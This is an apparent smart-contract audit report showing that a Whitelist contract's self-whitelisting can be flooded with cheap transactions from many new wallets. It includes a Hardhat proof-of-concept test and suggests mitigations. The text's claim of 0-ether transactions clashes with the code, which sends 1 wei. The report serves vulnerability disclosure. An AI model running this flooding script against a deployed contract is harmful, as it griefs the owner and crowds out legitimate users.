# Vulnerability details

## Impact
When self-whitelisting is enabled on the `Whitelist` contract, any malicious user can force the owner to increase the maximum allowed white list index by sending 0 ether from many different addresses. This can be stopped by simply disabling self whitelisting, however, solving an issue should not require disabling one of the functionalities of this contract indefinitely. It can be also mitigated by increasing the `_allowedWhitelistIndex`, but this approach would require constant action from the owner and would not solve the issue at its core. 

## Proof of Concept
To run a PoC paste the following test case in the `describe("Self-Whitelist"` branch of the  `hardhat-vultisig/test/unit/Whitelist.ts` test file:
```
it.only("Should self whitelist when ETH is sent", async function () {
            const { whitelist, otherAccount } = await loadFixture(
                deployWhitelistFixture
            );
            const maxIndex = 1000;
            await whitelist.setAllowedWhitelistIndex(maxIndex);
  
            const provider = ethers.provider;
  
            for (let i = 0; i < maxIndex; i++) {
                // Create a new random wallet for each iteration
                const newWallet = ethers.Wallet.createRandom().connect(provider);
  
               // Fund the new wallet with some ETH from otherAccount (or any funded account)
                const tx = await otherAccount.sendTransaction({
                    to: newWallet.address,
                    value: ethers.parseEther("0.1"), // more than 1 wei to pay for gas
                });
                await tx.wait();
  
                // Send a transaction from the new wallet to the whitelist contract
                const sendTx = await newWallet.sendTransaction({
                    to: whitelist,
                    value: 1,
                });
                await sendTx.wait();
  
                // Check if the new wallet is sucessfully whitelisted
                expect(await whitelist.whitelistIndex(newWallet.address)).to.eq(i + 1);
            }
        });
```
then run `npx hardhat test` in the `hardhat-vultisig` directory.

This proof of code showcases how adding 1000 addresses to the whitelist is easily doable when self-whitelisting is enabled. The cost of this attack is very small as it is only the price of gas for sending a transaction to the contract with `value` set to 0. 

## Tools Used
Manual review, Hardhat
## Recommended Mitigation Steps
To mitigate this issue without major changes a two-step whitelisting process could be implemented, where the owner has to approve "pending whitelisting", however, this would make the `pending` whitelist prone to the same vulnerability. A better approach would be to request a specific amount of funds to be transferred with `msg.value` which would be timelocked for a short period, making it fairer for other users that are not attempting to max out the index.
